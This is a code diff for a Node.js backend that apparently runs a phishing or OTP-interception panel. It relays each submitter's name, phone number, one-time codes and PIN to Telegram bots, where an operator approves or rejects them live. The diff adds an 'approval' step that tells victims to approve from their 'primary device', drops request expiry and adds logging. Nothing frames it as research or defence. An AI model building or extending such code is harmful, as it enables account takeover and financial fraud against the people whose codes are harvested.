@@ -8,14 +8,13 @@ const PORT = process.env.PORT || 10000;
 const DOMAIN = process.env.BACKEND_DOMAIN;
 
 // ---------- IN-MEMORY STORES ----------
-const phoneRequests = {};        // value: true/false or null
+const phoneRequests = {};
 const otpRequests = {};
 const pinRequests = {};
-const requestMeta = {};          // { name, phone, botId, otp?, ... }
-const requestTimestamps = {};    // creation timestamp
-
-// We'll also store when each request was processed (to show age)
-const processedTimestamps = {};  // { requestId: Date }
+const approvalRequests = {};
+const requestMeta = {};
+const requestTimestamps = {};
+const processedTimestamps = {};
 
 // ---------- BOTS ----------
 const bots = [];
@@ -47,7 +46,7 @@ async function sendTelegram(bot, text, buttons = []) {
       reply_markup: buttons.length ? { inline_keyboard: buttons } : undefined
     });
   } catch (e) {
-    console.error('❌ Telegram error:', e.response?.data || e.message);
+    console.error('❌ Telegram sendMessage error:', e.response?.data || e.message);
   }
 }
 
@@ -57,7 +56,9 @@ async function answerCallback(bot, id, extra = {}) {
       `https://api.telegram.org/bot${bot.token}/answerCallbackQuery`,
       { callback_query_id: id, ...extra }
     );
-  } catch {}
+  } catch (e) {
+    console.error('❌ answerCallbackQuery error:', e.response?.data || e.message);
+  }
 }
 
 // ---------- WEBHOOK MANAGEMENT ----------
@@ -221,6 +222,40 @@ app.get('/check-pin/:id', (req, res) => {
   res.json({ approved: pinRequests[req.params.id] ?? null });
 });
 
+// ---------- APPROVAL STEP ----------
+app.post('/submit-approval', (req, res) => {
+  try {
+    const { name, phone, botId } = req.body;
+    const bot = getBot(botId);
+    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
+
+    const requestId = uuidv4();
+    approvalRequests[requestId] = null;
+    requestMeta[requestId] = { name, phone, botId };
+    requestTimestamps[requestId] = Date.now();
+    processedTimestamps[requestId] = null;
+
+    sendTelegram(
+      bot,
+      `✅ USER HAS COMPLETED APPROVAL\n👤 Name: ${name}\n📞 Phone: ${phone}\n🆔 Ref: ${requestId}`,
+      [
+        [
+          { text: '✅ Allow', callback_data: `approval_ok:${requestId}` },
+          { text: '❌ Decline', callback_data: `approval_bad:${requestId}` }
+        ]
+      ]
+    );
+
+    res.json({ requestId });
+  } catch {
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.get('/check-approval/:id', (req, res) => {
+  res.json({ approved: approvalRequests[req.params.id] ?? null });
+});
+
 // ---------- TELEGRAM CALLBACK WEBHOOK ----------
 app.post('/telegram-webhook/:botId', async (req, res) => {
   try {
@@ -231,21 +266,27 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     }
 
     const cb = req.body.callback_query;
-    if (!cb) return res.sendStatus(200);
+    if (!cb) {
+      console.log('ℹ️ No callback_query in webhook payload');
+      return res.sendStatus(200);
+    }
+
+    console.log(`📩 Received callback: ${cb.data} from ${cb.from.id}`);
 
     const [action, requestId] = cb.data.split(':');
     const meta = requestMeta[requestId];
 
-    // ---------- Check if request exists ----------
+    // Check if request exists
     if (!meta) {
+      console.warn(`⏳ Request ${requestId} not found (expired or never existed)`);
       await answerCallback(bot, cb.id, {
-        text: '⏳ This request has expired (30 min limit) or was already processed. Please start a new application.',
+        text: '⏳ This request has expired or was already processed. Please start a new application.',
         show_alert: true
       });
       return res.sendStatus(200);
     }
 
-    // ---------- Check if already processed (prevent duplicates) ----------
+    // Check if already processed (prevent duplicates)
     let alreadyProcessed = false;
     let statusMessage = '';
     if (action.startsWith('phone_')) {
@@ -263,9 +304,15 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
         alreadyProcessed = true;
         statusMessage = pinRequests[requestId] ? '✅ already approved' : '❌ already rejected';
       }
+    } else if (action.startsWith('approval_')) {
+      if (approvalRequests[requestId] !== null) {
+        alreadyProcessed = true;
+        statusMessage = approvalRequests[requestId] ? '✅ already approved' : '❌ already rejected';
+      }
     }
 
     if (alreadyProcessed) {
+      console.log(`⏳ Request ${requestId} already processed: ${statusMessage}`);
       await answerCallback(bot, cb.id, {
         text: `⏳ This request was already ${statusMessage}.`,
         show_alert: true
@@ -314,8 +361,15 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
       pinRequests[requestId] = false;
       feedback = '❌ PIN rejected';
     }
+    if (action === 'approval_ok') {
+      approvalRequests[requestId] = true;
+      feedback = '✅ Approval granted – redirecting to success page';
+    }
+    if (action === 'approval_bad') {
+      approvalRequests[requestId] = false;
+      feedback = '❌ Approval declined – user must approve from primary device';
+    }
 
-    // Store processed timestamp
     processedTimestamps[requestId] = Date.now();
 
     if (feedback) {
@@ -326,6 +380,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     }
 
     await answerCallback(bot, cb.id);
+    console.log(`✅ Processed callback for ${requestId} -> ${feedback}`);
     res.sendStatus(200);
 
   } catch (err) {
@@ -358,21 +413,8 @@ app.get('/debug/bot', (req, res) => {
   });
 });
 
-// ---------- CLEANUP OLD REQUESTS (TTL = 30 minutes) ----------
-// setInterval(() => {
-//   const now = Date.now();
-//   const TTL = 30 * 60 * 1000; // 30 minutes
-//   for (const [id, ts] of Object.entries(requestTimestamps)) {
-//     if (now - ts > TTL) {
-//       delete phoneRequests[id];
-//       delete otpRequests[id];
-//       delete pinRequests[id];
-//       delete requestMeta[id];
-//       delete requestTimestamps[id];
-//       delete processedTimestamps[id];
-//     }
-//   }
-// }, 60000);
+// ---------- CLEANUP REMOVED (requests persist indefinitely) ----------
+// No TTL cleanup – requests stay in memory until server restart.
 
 // ---------- WEBHOOK REPAIR LOOP ----------
 setInterval(async () => {
